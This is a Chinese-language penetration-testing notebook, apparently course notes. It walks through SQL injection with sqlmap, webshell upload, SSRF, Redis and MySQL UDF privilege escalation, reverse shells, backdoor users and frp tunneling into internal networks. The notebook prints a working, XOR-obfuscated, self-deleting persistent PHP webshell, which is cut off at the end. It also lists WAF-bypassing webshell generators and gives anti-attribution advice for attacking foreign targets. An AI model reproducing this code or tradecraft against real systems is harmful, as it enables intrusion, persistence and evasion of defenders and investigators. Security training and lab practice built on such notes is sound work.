+<h5 id="数据库常用端口"><a href="#数据库常用端口" class="headerlink" title="数据库常用端口"></a>数据库常用端口</h5><p>mysql 3306<br>mssql 1433<br>oracle 1521<br>postgresql 5432<br>redis 6789</p>
+<ul>
+<li>相同点：都可以使用case when函数</li>
+<li>不同点：</li>
+<li><ul>
+<li>mysql使用if函数 mssql使用iif函数 oracle使用decode函数</li>
+</ul>
+</li>
+<li><ul>
+<li>用户函数：</li>
+</ul>
+</li>
+<li><ul>
+<li><ul>
+<li>mysql使用user()函数 当user()被禁用时可以尝试current_user() cerrent_user() session_user()</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><ul>
+<li>mssql使用user_name()和db_name()<br>通过不同数据库的不同函数可以判断数据库类型</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="自动化SQL注入工具sqlmap"><a href="#自动化SQL注入工具sqlmap" class="headerlink" title="自动化SQL注入工具sqlmap"></a>自动化SQL注入工具sqlmap</h5><p><a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap">sqlmap</a><br>GET请求<code>python sqlmap.py -u https://www.xxxxxxx.org/network-and-linkages.php?id=1 -p id</code><br>POST请求:建议使用第一种方式，因为不用指定cookie<br>    1.保存为txt文档使用<code>python sqlmap.py -r hello.txt -p id</code><br>    2.使用–data参数 <code>python sqlmap.py https://www.xxxxxx.org/network-and-linkages.php --data=&quot;id=1*&quot; --cookie</code><br>自动测试参数-batch:自动确认添加负载<br>风险等级测试: –level 1-5 3 或者–risk 1-3<br>清除缓存:–flush-session<br>指定sql注入类型:–technique&#x3D;TECH..<br>代理参数: –proxy&#x3D;PROXY<br>调试模式:-vvv<br>绕过WAF:–tamper&#x3D;脚本名称</p>
+<p>针对利用<br>获取数据库名称和用户名:–current-db –current-user<br>查看当前用户是否为DBA权限:–is-db<br>查询数据库名称:–dbs<br>查询指定数据库表名:-D 数据库名称 –tables<br>查询指定数据库指定表的列名:-D 数据库名称 -T 表名 –columns<br>查询字段名:-D 数据库名称 -T 表名 -C 列名 –dump<br>数据库交互:–sql-shell<br>服务器交互:–os-shell(sql server有xp_cmdshell函数可以使用，获取数据库管理员权限后打开此函数可以直接与服务器进行交互)<br>写入文件:–file-write xxx&#x2F;a.php(本地文件) –file-dest xxx&#x2F;yyy(服务器目录) 需要站点在服务器上的绝对路径，可以上传一句话木马<br><a target="_blank" rel="noopener" href="https://github.com/Audi-1/sqli-labs">sql-lib</a></p>
+<h3 id="7-4"><a href="#7-4" class="headerlink" title="7.4"></a>7.4</h3><h4 id="os-shell"><a href="#os-shell" class="headerlink" title="os-shell"></a>os-shell</h4><p>首先确认一下mysql数据库版本信息<br>在mysql 5.5 之前 secure_file_priv 默认是空，这种情况下可以向任意绝对路径写文件<br>在mysql 5.5 之后 secure_file_priv 默认是null，这种情况下不可以写文件</p>
+<ol>
+<li>需要确认secure_file_priv是否为空</li>
+<li>需要网站的绝对路径<br>获取绝对路径的方式</li>
+</ol>
+<ul>
+<li>网站报错信息</li>
+<li>phpinfo.php</li>
+<li>ubuntu默认路径 &#x2F;var&#x2F;www&#x2F;html</li>
+</ul>
+<ol start="3">
+<li>需要确认有写入权限</li>
+</ol>
+<p>-os-shell<br>mysql的os-shell参数是sqlmap向服务器写入了自己内置的木马<br>sqlserver当中os-shell参数是sqlmap打开了sqlserver的xp_cmdshell的一个函数</p>
+<p>常用执行函数<br>    eval()<br>    system()<br>    exec()<br>    passthru<br>使用hackbar可以在浏览器发送post请求 <code>cmd=system(&quot;whoami&quot;);</code><br><a target="_blank" rel="noopener" href="http://124.222.66.202:10013/">upload-labs</a></p>
+<h4 id="webshell管理工具"><a href="#webshell管理工具" class="headerlink" title="webshell管理工具"></a>webshell管理工具</h4><p>Godzilla<br>AntSword<br>冰蝎<br>Cknife</p>
+<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>获取到中间件是什么（Apache），可以搜索Apache解析漏洞，上传a.php.jpeg，会被解析为php文件<br>判断是windows还是linux：</p>
+<ul>
+<li>1.php 和 1. PHP linux大小写敏感(认为是两个文件) windows大小写不敏感</li>
+<li>根据端口开放状态判断</li>
+</ul>
+<h4 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h4><p>白名单 只允许上传jpg,png<br>黑名单</p>
+<h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p>利用:把任意文件当中的php代码进行执行</p>
+<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/tomato-1,557/">tomato</a></p>
+<h3 id="7-5"><a href="#7-5" class="headerlink" title="7.5"></a>7.5</h3><h4 id="SSRF-服务端请求伪造"><a href="#SSRF-服务端请求伪造" class="headerlink" title="SSRF(服务端请求伪造)"></a>SSRF(服务端请求伪造)</h4><p>用户访问漏洞服务器，漏洞服务器从内网调用了某些资源<br>攻击这伪造请求，通过外网服务器A间接访问内网服务器B的资源<br>漏洞解决方案：白名单限制</p>
+<h5 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h5><p>明显请求某些资源<br>请求参数中含有file filename url</p>
+<h5 id="SSRF-PHP相关危险函数："><a href="#SSRF-PHP相关危险函数：" class="headerlink" title="SSRF-PHP相关危险函数："></a>SSRF-PHP相关危险函数：</h5><p>file_get_contents()<br>fsockopen()<br>curl_exec()</p>
+<h5 id="相关协议"><a href="#相关协议" class="headerlink" title="相关协议"></a>相关协议</h5><p>Dict协议:字典服务器协议，主要用来探测内网端口<code>curl &#39;dict://127.0.0.1:22&#39;</code><br>Http协议:<code>curl http://www.baidu.com</code><br>file协议:本地文件传输协议<code>curl -v &#39;file://127.0.0.1/etc/passwd&#39;</code><br>Gopher协议:互联网上使用的分布式的文件搜集获取网络协议</p>
+<p>redis数据库默认安全没有密码 可以使用dict&#x2F;http协议进行内网端口探测，如果探测到有redis未授权漏洞 可以利用SSRF http协议 进行对内网的redis攻击</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/weblogic">weblogic</a><br><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost">Basic SSRF against the local server</a></p>
+<h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><p>利用xss获取管理员的Cookie<br>反射型:用来钓鱼，引导目标点击连接从而获取其cookie<br>存储型:嵌入到页面中，任何人访问该页面都会触发xss<br>DOM型:需要页面本身具有节点</p>
+<h5 id="漏洞挖掘-1"><a href="#漏洞挖掘-1" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h5><p>存在用户写入的地方就有可能存在</p>
+<h5 id="常用xss函数"><a href="#常用xss函数" class="headerlink" title="常用xss函数"></a>常用xss函数</h5><p>alert()<br>confirm()<br>prompt()</p>
+<h4 id="如何进行渗透测试"><a href="#如何进行渗透测试" class="headerlink" title="如何进行渗透测试"></a>如何进行渗透测试</h4><ol>
+<li>信息收集：IP，端口，服务器操作系统，中间件，脚本语言，开发框架，指纹，目录扫描(优先找后台地址)<br> TscanPlus 各个端口弱口令爆破工具</li>
+<li>弱口令测试、JS文件发现是否有敏感信息(JSFinder)</li>
+<li>常规的一些漏洞测试，自动化测试<ul>
+<li>用一些工具扫描:xray,EZ(ezreal)</li>
+<li>自定义字典进行测试:逻辑漏洞、文件上传漏洞测试不了的，要添加反连平台针对Fastjson log4j Strurs2</li>
+</ul>
+</li>
+<li>测试痕迹清理</li>
+<li>输出报告</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13243?time__1311=mqmxnDBD9DyD2QCD/D0Y1Q4cxfOADIh+wqrD&alichlgref=https://www.google.com/">ezreal的下载及使用</a></p>
+<h3 id="7-8"><a href="#7-8" class="headerlink" title="7.8"></a>7.8</h3><p><a target="_blank" rel="noopener" href="https://www.yuque.com/hudte/note_1/ic4qlgn67b0tuvbm">雨雀</a></p>
+<h4 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h4><p>通过web漏洞或者一些nday，0day获得的webshell提权内网穿透权限持久化内网横向</p>
+<h5 id="Windows提权"><a href="#Windows提权" class="headerlink" title="Windows提权"></a>Windows提权</h5><ol>
+<li>获取webshell<br>通过历史漏洞获取：Shiro，thinkphp、truts2</li>
+<li>提权<ul>
+<li>为什么要提权？提权主要目的就是权限维持</li>
+<li>提权的思路：<br>  (1)根据漏洞进行提权(Windows土豆系列提权,Linux脏牛漏洞)<br>  (2)根据第三方服务（mysql,SQLserver,oracle）<br>  (3)错误配置的方式提权</li>
+</ul>
+</li>
+</ol>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/zan8in/afrog">afrog</a>使用<br><code>./afrog  -s漏洞类型  strust2 -S高危漏洞  critical  -T struts2_url.txt  -o生成 struts2.html -pl</code><br><code>Fofa结果放入  strust2_url.txt</code></p>
+</li>
+<li><p>dismap识别框架<br>标注出是apache的框架，然后用框架进行漏洞检测<br>框架工具：<br><a target="_blank" rel="noopener" href="https://github.com/abc123info/Struts2VulsScanTools">Struts2全版本漏洞检测工具 by:ABC_123</a><br>Strusts2 填写url 检测漏洞<br>然后点击命令执行，如果执行不了<br>在服务器信息中有路径，可以上传shell文件，来获得webshell<br><a target="_blank" rel="noopener" href="https://github.com/Kevil-hui/BestShell/blob/master/best_php_shell.php">best_php_shell</a><br>可以上传哥斯拉木马<br>如果搭建网站的用户没有管理员权限，那么当提权以后，权限也不是管理员，只是和搭建者一样如&#x2F;etc&#x2F;shadow就无法访问，但可以useradd添加一个后门用户</p>
+</li>
+<li><p>内网穿透<br>有时候当扫描端口后会发现某些端口是对外网拦截的，这时候就需要用代理服务器将自己变成内网地址来访问内网端口</p>
+</li>
+</ul>
+<ol start="3">
+<li>内网信息收集<br>(1)操作系统详细信息<br>(2)网段信息：本机网卡信息，是否可以访问到其它网段，路由信息，当前网络所处位置（很难判断）ps、netstat、&#x2F;etc&#x2F;hosts history  route<br>(3)漏洞信息（主机漏洞）、杀软信息<br>(4)windows（存在域） –&gt;域信息收集</li>
+</ol>
+<h5 id="mysql提权"><a href="#mysql提权" class="headerlink" title="mysql提权"></a>mysql提权</h5><p>靶机: reven2</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">1. 访问网站目录<br>在 http://192.168.23.144//vendor/PATH 目录下发现flag1&#123;a2c1f66d2b8051bd3a5874b5b6e43e21&#125;<br>2. 利用反弹shell获取webshell<br>在kali中使用searchsploit phpmailer查找相关漏洞利用文件/usr/share/exploitdb/exploits/php/webapps/40974.py<br>拷贝到桌面并配置靶机地址和主机ip端口(4444)等<br>运行40974.py<br>在本机上监听4444端口然后访问 http://192.168.23.144/contact.php 使其生成shell.php文件<br>，然后可以访问到 http://192.168.23.144/shell.php ，此时监听端口处获取了反弹shell。但是这个shell并不完整，在反弹shell中运行python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>;<br>从而获取完整性shell，将shell转化为pty shell。<br>3. 获取所需信息<br>使用find命令find /var -name <span class="hljs-string">&quot;flag*&quot;</span>在/var目录下找到了flag文件<br><span class="hljs-built_in">cat</span> /var/www/flag2.txt得到flag2&#123;6a8ed560f0b5358ecf844108048eb337&#125;<br>访问 http://192.168.23.144/wordpress/wp-content/uploads/2018/11/flag3.png 查看图片得到flag3&#123;a0f568aa9de277887f37730d71520d9b&#125;<br><span class="hljs-built_in">cat</span> /wordpress/wp-config.php 得到数据库用户名/密码:root/R@v3nSecurity<br>4. 提权<br>LinEnum是一款Linux文件枚举及权限提升检查工具，可以帮助渗透测试人员对linux系统漏洞或安全问题进行一键式体检<br></code></pre></td></tr></table></figure>
+
+<h6 id="数据库提权："><a href="#数据库提权：" class="headerlink" title="数据库提权："></a>数据库提权：</h6><p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/11/mysql.html">MySQL 漏洞利用与提权</a><br><code>select &#39;&lt;?php phpinfo(); ?&gt;&#39; into outfile &#39;/var/www/html/info.php&#39;;</code><br><code>sqlmap -u &quot;http://x.x.x.x/?id=x&quot; --file-write=&quot;/Users/guang/Desktop/shell.php&quot; --file-dest=&quot;/var/www/html/test/shell.php&quot;</code><br>mysql：<br>(1)sql注入漏洞进行提权，DBA权限，secure_file_priv 为空 –&gt;-sql-shell &#x2F;var&#x2F;www&#x2F;html<br>(2)通过其他漏洞获取webshell权限，通过配置文件获取数据库账号密码<br>内网本地的mysql，如何在个人pc连接？<br>(1)通过代理工具实现，frp的端口映射<br>(2)可以使用navicat脚本实现<br>哥斯拉上传ntunnel_mysql.php文件，之后访问localhost&#x2F;ntunnel.php，登录账号密码在config文件中，navicat连接数据库勾选http隧道。</p>
+<h6 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h6><p>USER defined function 在exploit-db.com找到mysql的UDF脚本(kali中可以直接使用searchsploit mysql udf)<br>按照说明书文档运行两条指令编译为so文件，登录数据库，建表，插入so文件，查询所有内容确认导入成功，创建函数，查询确认创建成功；使用find命令提权，得到一个root权限的shell或者按照本次靶机中的攻击方式获取反弹shell<br>MDAT<br>地址127.0.0.1，勾选http隧道，连接登录账号密码在config文件中,一键提权</p>
+<p>GitHub udf.php大马，通过webshell上传，访问后选择mysql提权。（还包括其他功能：上传文件，执行php文件，提权等）</p>
+<h6 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h6><p>(在Windows Server 2003环境下才可以成功)</p>
+<p>mssql，orcale与mysql类似更改端口名和数据库类型</p>
+<h6 id="redis数据库提权"><a href="#redis数据库提权" class="headerlink" title="redis数据库提权"></a>redis数据库提权</h6><p>redis数据库–&gt;nacos获得redis数据库的账号密码<br>1.可以向服务器写入计划任务进行反弹shell操作（Linux系统）<br>2.可以写入webshell到网站根目录下（需要知道网站根目录）<br>3.可以写入ssh公钥<br>4.写入的权限，针对&#x2F;etc&#x2F;shadow文件进行覆盖（不建议，很危险）</p>
+<h3 id="7-9"><a href="#7-9" class="headerlink" title="7.9"></a>7.9</h3><p><a target="_blank" rel="noopener" href="https://www.yuque.com/hudte/note_1/ic4qlgn67b0tuvbm">雨雀</a></p>
+<h4 id="Windows-xp提权"><a href="#Windows-xp提权" class="headerlink" title="Windows xp提权"></a>Windows xp提权</h4><p>用kali生成一个payload，使用的是msf来生成后门木马</p>
+<p>msfvenom -p windows&#x2F;x86&#x2F;meterpreter</p>
+<p>但当反弹后就被禁止掉了跟payload有关<br>首先确认进程是否存在，结果发现进程已经掉了，说明这个payload还是不行</p>
+<p>于是重新生成一个x86，经过一番试验发现Windowsxp 32位没有成功</p>
+<p>改用Windows server2013来尝试<br>可以<br>在获得shell后发现自己已经是管理员权限，所以尝试提升到system权限<br>meterpreter是后渗透模块<br>可以从网上找到一些meterpreter的基本命令</p>
+<p>使用msf6模块<br>基本上只设置session会话，可以查看session id</p>
+<h4 id="Windows提权-1"><a href="#Windows提权-1" class="headerlink" title="Windows提权"></a>Windows提权</h4><p>到GitHub上可以找到一些土豆系列漏洞可以利用的脚本</p>
+<ol>
+<li>meterpreter getsystem提权</li>
+<li>meterpreter 内置的本地提权漏洞库进行对比检使用msf内置的漏洞利用模块进行提权</li>
+<li>使用一些影响范围较大的漏洞先进行提权（土豆家族系列）</li>
+<li>使用工具针对Windows系统的补丁信息进行对比，列举出存在的未修补的漏洞，后续使用这些漏洞进行exp进行提权</li>
+<li>Hash攻击提权</li>
+<li>UAC欺骗提权：使用ask模块，set filename  filename.exe 运行时</li>
+</ol>
+<h4 id="漏洞扫描工具："><a href="#漏洞扫描工具：" class="headerlink" title="漏洞扫描工具："></a>漏洞扫描工具：</h4><ul>
+<li>Wesng<br>  通过文件上传和文件下载将wesng放入靶机，运行python脚本py wes.py -m info.txt扫描漏洞，如果有漏洞输出到info.txt(文件需要手动创建，不会自动创建)</li>
+<li>WinPEAS<br>  扫描所有漏洞给出cve编号和攻击脚本，还能扫出所有敏感文件如password等</li>
+</ul>
+<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><ul>
+<li>正向连接：<br>  打开目标机器的端口，使用自己机器去连接机器<br>  Web服务，ssh，telnet，远程桌面</li>
+<li>反向连接：<br>  攻击者指定服务器，受害者主机主动连接攻击者的服务程序。<ul>
+<li>反弹shell常见方式<br>  netcat、bash（最常用）、msf、socat、telnet、python脚本（成功率高）、perl脚本、ruby脚本</li>
+</ul>
+</li>
+</ul>
+<h3 id="7-10"><a href="#7-10" class="headerlink" title="7.10"></a>7.10</h3><h4 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h4><p><a target="_blank" rel="noopener" href="https://www.yuque.com/hudte/note_1/ic4qlgn67b0tuvbm">雨雀</a><br>在Linux的主机中，创建低权限用户后，执行msfshell上线。</p>
+<h5 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h5><p>在msf中生成payload并配置好相关参数<br>在测试时将将文件上传到temp目录，所有用户都可以向其中写入，所以在防御排查时也首先看这个目录<br>关注cve2021__4034（脏牛）<br>在msfconsole中选择cve_2021_4034，然后配置相关信息进行攻击</p>
+<p>如果找到漏洞但msf没有打出来，可以从GitHub上找其它针对这个漏洞的脚本<br>有时我们会发现有些文件或者目录的所属主的权限会带s标识。当s这个标志出现在文件所有者的x权限上时，如&#x2F;usr&#x2F;bin&#x2F;passwd文件的权限状态：“-rwsr-xr-x.”，此时就被称为Set UID，简称为SUID权限。</p>
+<p>思路：</p>
+<ol>
+<li>先找有suid的文件</li>
+<li>怎么找有suid的文件，用find命令加上各种参数</li>
+</ol>
+<h5 id="Metasploit（准备公网ip的服务器）"><a href="#Metasploit（准备公网ip的服务器）" class="headerlink" title="Metasploit（准备公网ip的服务器）"></a>Metasploit（准备公网ip的服务器）</h5><p><a target="_blank" rel="noopener" href="https://www.yuque.com/hudte/note_1/xh2z7hervxw6nsor">雨雀</a></p>
+<ol>
+<li>漏洞的发现和利用</li>
+<li>当成远控来使用—&gt;后渗透的一些操作<br>最初时ruby的脚本集合</li>
+</ol>
+<ul>
+<li>功能：<ol>
+<li>漏洞扫描</li>
+<li>漏洞利用</li>
+<li>后渗透</li>
+<li>恶意软件分析</li>
+<li>社区共享</li>
+</ol>
+</li>
+<li>Metasploit模块<br><code>MetasploitFramework、Exploit （最重要）、Payload、Auxiiliary、Post、Meterpreter、Module</code></li>
+<li>架构<br><code>Console、RCP Server、Database、Payload Generator、Exploit Database</code></li>
+</ul>
+<h5 id="漏洞扫描工具"><a href="#漏洞扫描工具" class="headerlink" title="漏洞扫描工具"></a>漏洞扫描工具</h5><p>Nessus、OpenVAS、</p>
+<p>漏洞扫描模块指令<br>漏洞利用模块指令</p>
+<h5 id="Metasploit远程控制模块的使用"><a href="#Metasploit远程控制模块的使用" class="headerlink" title="Metasploit远程控制模块的使用"></a>Metasploit远程控制模块的使用</h5><ol>
+<li>使用漏洞利用模块</li>
+<li>使用后门模块</li>
+<li>使用社会工程学攻击模块<br><a target="_blank" rel="noopener" href="https://www.yuque.com/hudte/note_1/xh2z7hervxw6nsor?singleDoc#">https://www.yuque.com/hudte/note_1/xh2z7hervxw6nsor?singleDoc#</a> 《Metasploit》</li>
+</ol>
+<h3 id="7-11"><a href="#7-11" class="headerlink" title="7.11"></a>7.11</h3><h4 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h4><h3 id="7-12"><a href="#7-12" class="headerlink" title="7.12"></a>7.12</h3><h4 id="内网穿透技术"><a href="#内网穿透技术" class="headerlink" title="内网穿透技术"></a>内网穿透技术</h4><p>攻击机与内网中的一些机器不在同一域中,<br>内网代理工具的使用,frp(免杀),nps</p>
+<ol>
+<li>使用webshell连接靶机，收集网卡信息和网络情况(包括使用history命令收集历史命令中的信息):<br> ifconfig:查看网卡地址<br> route:查看路由<br> &#x2F;etc&#x2F;hosts<br> netstat -anop:查看连接信息<br> 使用工具探测网络情况:<a target="_blank" rel="noopener" href="https://github.com/shmilylty/netspy">netspy</a></li>
+<li>服务器c段扫描<a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan/releases/tag/1.8.4">fscan</a>:<code>fscan -h 192.168.100.1/24 -nobr</code>可以探测到当前网段中存在的tcp连接和常见的端口的的网页(选择对密码进行爆破会很慢)</li>
+<li>内网渗透<br> <a target="_blank" rel="noopener" href="https://fangcaicoding.cn/archives/4d15d44c-8f31-49f6-9c5f-daf5bb4e4055">frp快速反向代理</a>:可以使用Godzilla大文件上传功能将frp客户端上传至靶机(服务端解压后<code>rm -f frpc*</code>-&gt;<code>chmod +x frps*</code>-&gt;<code>编辑frps.toml配置文件</code>-&gt;<code>./frps -c ./frps.toml</code>，客户端解压后<code>rm -f frps*</code>-&gt;<code>chmod +x frpc*</code>-&gt;<code>编辑frpc.toml配置文件</code>-&gt;<code>./frpc -c ./frpc.toml</code>)，frps.toml、frpc.toml分别保存了frp服务端、客户端主要配置信息(使用时先配置并启动服务端后再配置并启动客户端)，使用nohup可以使代理在后台运行(更加稳定)<br> 使用firefox设置代理到反向代理的ip和端口，之后可以使用firefox访问到的内网资源<br> 使用proxiefier可以更加灵活地配置代理<br> 目的:内网环境<br> kali内置工具proxychains4:扫描目录</li>
+</ol>
+<h3 id="7-15"><a href="#7-15" class="headerlink" title="7.15"></a>7.15</h3><h4 id="Webshell查杀"><a href="#Webshell查杀" class="headerlink" title="Webshell查杀"></a>Webshell查杀</h4><p><a target="_blank" rel="noopener" href="https://www.yuque.com/u22103703/csqb9v/qipvzd">雨雀</a>   密码：gs4p<br>webshell合集仓库：<a target="_blank" rel="noopener" href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a><br>git clone <a target="_blank" rel="noopener" href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a><br>或者使用国内镜像<br>git clone <a target="_blank" rel="noopener" href="https://githubfast.com/tennc/webshell">https://githubfast.com/tennc/webshell</a></p>
+<h5 id="常规Webshell"><a href="#常规Webshell" class="headerlink" title="常规Webshell"></a>常规Webshell</h5><h6 id="常规Webshell查杀工具"><a href="#常规Webshell查杀工具" class="headerlink" title="常规Webshell查杀工具"></a>常规Webshell查杀工具</h6><ul>
+<li><p>D盾:<br>  首次查杀会自动联网下载webshell的特征库，基于特征库匹配<br>  只有windows版本嵌入到windows的IS中间件中，可以承担IS的WAF的作用</p>
+</li>
+<li><p>河马<br>  <a href="www.shellpub.com">河马</a>下载<code>wget https://dl.shellpub.com/hm/latest/hm-linux-amd64.tgz?version=1.8.3 -O hm-linux-amd64.tgz</code>并解压<code>tar xf hm-linux-amd64.tgz </code><br>  查杀<code>./hm scan 文件目录</code><br>  深度查杀<code>./hm deepscan 文件目录</code></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/chaitin/cloudwalker">CloudWalker</a><br><code>chmod +x webshell-detector-1.0.0-linux-amd64</code></p>
+</li>
+</ul>
+<h6 id="webshell查杀工具的弊端"><a href="#webshell查杀工具的弊端" class="headerlink" title="webshell查杀工具的弊端"></a>webshell查杀工具的弊端</h6><p>工具中的特征库不能及时更新特征库甚至已经停止更新特征库，从而无法查杀新式的木马</p>
+<h6 id="webshell的绕过，作者Tas9er"><a href="#webshell的绕过，作者Tas9er" class="headerlink" title="webshell的绕过，作者Tas9er"></a>webshell的绕过，作者Tas9er</h6><p><a target="_blank" rel="noopener" href="https://github.com/Tas9er">https://github.com/Tas9er</a> 随机生成webshell(在其中随机添加垃圾数据) 可以绕过一些WAF的拦截<br><a target="_blank" rel="noopener" href="https://github.com/Tas9er/ByPassBehinder">https://github.com/Tas9er/ByPassBehinder</a>    随机生成绕过防护设备的冰蝎3 webshell<br><a target="_blank" rel="noopener" href="https://github.com/Tas9er/ByPassGodzilla">https://github.com/Tas9er/ByPassGodzilla</a>    随机生成绕过防护设备的哥斯拉 webshell<br><a target="_blank" rel="noopener" href="https://github.com/Tas9er/ByPassBehinder4J">https://github.com/Tas9er/ByPassBehinder4J</a>  随机生成绕过防护设备的冰蝎4 webshell</p>
+<p><em>参加攻防赛时，国外的目标可以使用国内的木马，同理国内目标可以使用国外的木马，因为国内外木马的特征库不同，这样可以降低木马被防守方发现的概率<br>参加高级信息攻防任务时，例如攻击国外时，要有反侦察意识:不使用国内木马，浏览器使用文字不能为中文，时区不能为东八区，从攻击时间不能看出自己国家的节日等等</em></p>
+<h5 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h5><p>以线程注入为代表的这一类技术，通过将木马注入到系统进程和删除自身进程的方式，来躲避杀毒软件的查杀和实现自身的隐藏。</p>
+<h6 id="php内存马"><a href="#php内存马" class="headerlink" title="php内存马"></a>php内存马</h6><p>PHP内存马也叫不死马，是通过内存马启动后删除文件本身之前，使代码在内存中执行死循环，使管理员无法删除内存马，达到权限维持的目的。</p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs swift">shell.php<br><span class="hljs-operator">&lt;?</span>php<br>ignore_user_abort(<span class="hljs-literal">true</span>);<span class="hljs-comment">//与客户机断开不会终止脚本的执行</span><br>set_time_limit(<span class="hljs-number">0</span>);<span class="hljs-comment">//表示页面将持续运行</span><br>unlink(__FILE__);<span class="hljs-comment">//删除文件（防止文件落地被检测工具查杀）</span><br><span class="hljs-variable">$file</span><span class="hljs-operator">=</span>&#x27;<span class="hljs-operator">./.</span>7b34e9981883b1eb6df6c30089d88fb3.php&#x27;;<br><span class="hljs-variable">$code</span><span class="hljs-operator">=</span>&#x27;<span class="hljs-operator">&lt;?</span>php <span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;pass&quot;</span>])<span class="hljs-operator">==</span><span class="hljs-string">&quot;ff5cff09be577f8b2251062bd06eca3c&quot;</span>)&#123;<span class="hljs-comment">//设置密码，对比密码的md5值</span><br>$&#123;(<span class="hljs-string">&quot;#&quot;</span><span class="hljs-operator">^</span><span class="hljs-string">&quot;|&quot;</span>).(<span class="hljs-string">&quot;#&quot;</span><span class="hljs-operator">^</span><span class="hljs-string">&quot;|&quot;</span>)&#125;<span class="hljs-operator">=</span>(<span class="hljs-string">&quot;!&quot;</span><span class="hljs-operator">^</span><span class="hljs-string">&quot;`&quot;</span>).(<span class="hljs-string">&quot;(&quot;</span><span class="hljs-operator">^</span><span class="hljs-string">&quot;&#123;&quot;</span>).(<span class="hljs-string">&quot;(&quot;</span><span class="hljs-operator">^</span><span class="hljs-string">&quot;[&quot;</span>).(<span class="hljs-string">&quot;~&quot;</span><span class="hljs-operator">^</span><span class="hljs-string">&quot;;&quot;</span>).(<span class="hljs-string">&quot;|&quot;</span><span class="hljs-operator">^</span><span class="hljs-string">&quot;.&quot;</span>).(<span class="hljs-string">&quot;*&quot;</span><span class="hljs-operator">^</span><span class="hljs-string">&quot;~&quot;</span>);$&#123;(<span class="hljs-string">&quot;#&quot;</span><span class="hljs-operator">^</span><span class="hljs-string">&quot;|&quot;</span>).(<span class="hljs-string">&quot;#&quot;</span><span class="hljs-operator">^</span><span class="hljs-string">&quot;|&quot;</span>)&#125;((<span class="hljs-string">&quot;-&quot;</span><span class="hljs-operator">^</span><span class="hljs-string">&quot;H&quot;</span>).(<span class="hljs-string">&quot;]&quot;</span><span class="hljs-operator">^</span><span class="hljs-string">&quot;+&quot;</span>).(<span class="hljs-string">&quot;[&quot;</span><span class="hljs-operator">^</span><span class="hljs-string">&quot;:&quot;</span>).(<span class="hljs-string">&quot;,&quot;</span><span class="hljs-operator">^</span><span class="hljs-string">&quot;@&quot;</span>).(<span class="hljs-string">&quot;&#125;&quot;</span><span class="hljs-operator">^</span><span class="hljs-string">&quot;U&quot;</span>).(<span class="hljs-string">&quot;~&quot;</span><span class="hljs-operator">^</span><span class="hljs-string">&quot;&gt;&quot;</span>).(<span class="hljs-string">&quot;e&quot;</span><span class="hljs-operator">^</span><span class="hljs-string">&quot;A&quot;</span>).(<span class="hljs-string">&quot;(&quot;</span><span class="hljs-operator">^</span><span class="hljs-string">&quot;w&quot;</span>).(<span class="hljs-string">&quot;j&quot;</span><span class="hljs-operator">^</span><span class="hljs-string">&quot;:&quot;</span>).(<span class="hljs-string">&quot;i&quot;</span><span class="hljs-operator">^</span><span class="hljs-string">&quot;&amp;&quot;</span>).(<span class="hljs-string">&quot;#&quot;</span><span class="hljs-operator">^</span><span class="hljs-string">&quot;p&quot;</span>).(<span class="hljs-string">&quot;&gt;&quot;</span><span class="hljs-operator">^</span><span class="hljs-string">&quot;j&quot;</span>).(<span class="hljs-string">&quot;!&quot;</span><span class="hljs-operator">^</span><span class="hljs-string">&quot;z&quot;</span>).(<span class="hljs-string">&quot;]&quot;</span><span class="hljs-operator">^</span><span class="hljs-string">&quot;&gt;&quot;</span>).(<span class="hljs-string">&quot;@&quot;</span><span 